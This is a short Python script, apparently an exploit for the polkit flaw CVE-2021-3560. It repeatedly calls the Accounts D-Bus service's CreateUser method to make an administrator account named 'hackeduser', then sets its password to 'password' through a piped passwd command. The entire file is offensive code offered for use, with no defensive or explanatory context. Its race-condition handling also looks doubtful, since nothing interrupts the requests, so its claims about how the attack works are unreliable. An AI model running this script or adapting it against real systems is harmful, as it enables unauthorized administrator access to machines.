#!/usr/bin/env python3

import dbus
import os
import time
import subprocess
from multiprocessing import Process

USERNAME = "hackeduser"
REALNAME = "Hacked User"
PASSWORD = "password"

def send_exploit():
    try:
        bus = dbus.SystemBus()
        proxy = bus.get_object('org.freedesktop.Accounts',
                               '/org/freedesktop/Accounts')
        iface = dbus.Interface(proxy, 'org.freedesktop.Accounts')
        iface.CreateUser(USERNAME, REALNAME, 1)  # 1 = admin
    except Exception as e:
        pass  # expected to throw due to race condition

def run_exploit():
    print("[*] Running CVE-2021-3560 exploit...")
    for i in range(1000):
        p = Process(target=send_exploit)
        p.start()
        time.sleep(0.001)

def set_password():
    print("[*] Setting password for the user...")
    subprocess.run(["bash", "-c", f"echo -e '{PASSWORD}\n{PASSWORD}' | passwd {USERNAME}"])

def check_user_created():
    try:
        result = subprocess.check_output(["id", USERNAME])
        return True
    except subprocess.CalledProcessError:
        return False

def main():
    run_exploit()
    time.sleep(2)
    if check_user_created():
        print(f"[+] User '{USERNAME}' created successfully!")
        set_password()
        print(f"[+] Done! Try: su - {USERNAME} (Password: {PASSWORD})")
    else:
        print("[-] Exploit failed. Try running it again or increase the iterations.")

if __name__ == "__main__":
    main()
